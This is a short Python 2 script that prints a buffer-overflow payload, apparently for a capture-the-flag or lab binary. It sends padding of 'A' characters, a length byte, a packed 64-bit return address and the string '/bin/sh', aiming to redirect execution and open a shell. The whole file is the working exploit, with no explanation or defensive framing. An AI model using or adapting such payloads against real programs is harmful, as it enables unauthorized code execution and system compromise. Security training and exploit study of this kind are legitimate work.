#!/usr/bin/env python
import struct
string = "A" * 40 + "\xff\n"
command = "/bin/sh"
print string + "A" * 200 + struct.pack("Q", 0x000055555555488c) + "\n" + "/bin/sh"
